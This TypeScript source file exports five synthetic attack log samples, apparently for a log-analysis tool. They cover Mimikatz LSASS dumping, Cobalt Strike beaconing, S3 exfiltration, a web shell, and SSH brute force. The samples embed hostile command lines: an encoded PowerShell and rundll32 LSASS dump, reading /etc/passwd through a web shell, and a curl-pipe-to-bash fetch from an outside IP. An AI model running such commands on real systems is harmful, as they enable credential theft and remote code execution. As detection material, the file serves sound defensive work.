import { LogSample } from '../types';

export const SAMPLE_LOGS: LogSample[] = [
  {
    id: 'sample-1',
    name: 'Windows LSASS Credential Dumping (Mimikatz / Event 4688)',
    description: 'Process creation event showing privilege escalation and memory dump targeting lsass.exe',
    logType: 'windows',
    rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54410530-8426-4100-832d-222c77137744}" />
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-08-08T10:14:22.1892301Z" />
    <EventRecordID>9814221</EventRecordID>
    <Correlation />
    <Execution ProcessID="4" ThreadID="280" />
    <Channel>Security</Channel>
    <Computer>FIN-DC01.CORP.INTERNAL</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-397955417-626881126-188441444-1104</Data>
    <Data Name="SubjectUserName">admin_svc</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x3e7a1</Data>

    <Data Name="NewProcessId">0x1a84</Data>
    <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c "powershell -nop -w hidden -enc JABzAAP... && rundll32.exe C:\\Users\\Public\\mimikatz.dll,DumpLSASS processid=672 mini=C:\\Windows\\Temp\\lsass.dmp"</Data>

    <Data Name="ParentProcessName">C:\\Windows\\System32\\wip.exe</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">-</Data>
    <Data Name="TargetDomainName">-</Data>
    <Data Name="TargetLogonId">0x0</Data>
    <Data Name="Hashes">SHA256=a2f58e119bc840a1d90823f9901bd348e89f3014a01c897f22314a51e605d81b</Data>
  </EventData>
</Event>`
  },
  {
    id: 'sample-2',
    name: 'Suricata C2 Beaconing Alert (Cobalt Strike / EVE JSON)',
    description: 'Suricata IDS alert detecting encrypted TLS C2 traffic to known malicious IP with custom HTTP headers',
    logType: 'suricata',
    rawLog: `{
  "timestamp": "2026-08-08T11:42:01.309221+0000",
  "flow_id": 182930192381,
  "in_iface": "eth0",
  "event_type": "alert",
  "src_ip": "192.168.1.105",
  "src_port": 49210,
  "dest_ip": "185.220.101.5",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2024892,
    "rev": 4,
    "signature": "ET TROJAN Cobalt Strike Malleable C2 HTTP Beaconing Response (JARM Matches 27d27d27d27d)",
    "category": "A Network Trojan was detected",
    "severity": 1,
    "metadata": {
      "affected_product": ["Windows_SMB"],
      "attack_target": ["Enterprise_Host"],
      "created_at": ["2023_04_12"],
      "mitre_technique_id": ["T1071.001"],
      "mitre_tactic_name": ["Command and Control"]
    }
  },
  "http": {
    "hostname": "cdn-update-auth.com",
    "url": "/api/v1/telemetry?id=829103",
    "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "http_content_type": "application/octet-stream",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200,
    "length": 4096
  },
  "payload_printable": "POST /push?token=d2FybG9jazE3Mw== HTTP/1.1\\r\\nHost: cdn-update-auth.com\\r\\nUser-Agent: CobaltStrike/4.8",
  "stream": 0
}`
  },
  {
    id: 'sample-3',
    name: 'AWS CloudTrail S3 Data Exfiltration & IAM Key Abuse',
    description: 'CloudTrail log depicting unauthorized GetObject requests from suspicious external IP using exposed access key',
    logType: 'cloudtrail',
    rawLog: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA3X4Y5Z6A7B8C9D0E1",
    "arn": "arn:aws:iam::123456789012:user/devops_ci_cd",
    "accountId": "123456789012",
    "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "userName": "devops_ci_cd"
  },
  "eventTime": "2026-08-08T12:05:14Z",
  "eventSource": "s3.amazonaws.com",
  "eventName": "GetObject",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "45.142.214.18",
  "userAgent": "python-requests/2.31.0 AWS-CLI/2.11.0",
  "errorCode": "Client.UnauthorizedAccess",
  "errorMessage": "Access Denied due to geo-restriction policy violation",
  "requestParameters": {
    "bucketName": "prod-customer-pii-backups-2026",
    "Host": "prod-customer-pii-backups-2026.s3.amazonaws.com",
    "key": "exports/database_dump_full_20260801.tar.gz"
  },
  "responseElements": null,
  "additionalEventData": {
    "SignatureVersion": "SigV4",
    "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
    "bytesTransferredOut": 1548291048
  }
}`
  },
  {
    id: 'sample-4',
    name: 'Nginx Web Server Exploit & Web Shell Execution',
    description: 'Apache/Nginx access log showing CVE-2023-50164 Struts path traversal & webshell command execution',
    logType: 'apache_nginx',
    rawLog: `198.51.100.42 - - [08/Aug/2026:13:01:22 +0000] "POST /upload.action HTTP/1.1" 200 1420 "https://victim-corp.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
198.51.100.42 - - [08/Aug/2026:13:01:25 +0000] "POST /uploads/cmd.jsp?cmd=whoami HTTP/1.1" 200 48 "http://victim-corp.com/" "Mozilla/5.0"
198.51.100.42 - - [08/Aug/2026:13:01:29 +0000] "GET /uploads/cmd.jsp?cmd=cat%20/etc/passwd HTTP/1.1" 200 2481 "http://victim-corp.com/" "Mozilla/5.0"
198.51.100.42 - - [08/Aug/2026:13:01:34 +0000] "POST /uploads/cmd.jsp?cmd=curl%20-s%20http://91.240.118.12/linpeas.sh%20|%20bash HTTP/1.1" 200 18920 "http://victim-corp.com/" "curl/7.81.0"`
  },
  {
    id: 'sample-5',
    name: 'Linux SSH Brute Force & Root Compromise (auth.log)',
    description: 'Linux Authentication log showing password spraying attack followed by successful root session elevation',
    logType: 'auth_log',
    rawLog: `Aug  8 09:12:01 secure-srv sshd[14201]: Failed password for invalid user admin from 103.253.42.12 port 51022 ssh2
Aug  8 09:12:03 secure-srv sshd[14203]: Failed password for invalid user root from 103.253.42.12 port 51024 ssh2
Aug  8 09:12:05 secure-srv sshd[14205]: Failed password for invalid user postgres from 103.253.42.12 port 51026 ssh2
Aug  8 09:12:08 secure-srv sshd[14209]: Accepted password for deploy from 103.253.42.12 port 51030 ssh2
Aug  8 09:12:09 secure-srv sshd[14209]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Aug  8 09:12:15 secure-srv sudo: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Aug  8 09:12:15 secure-srv sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)`
  }
];
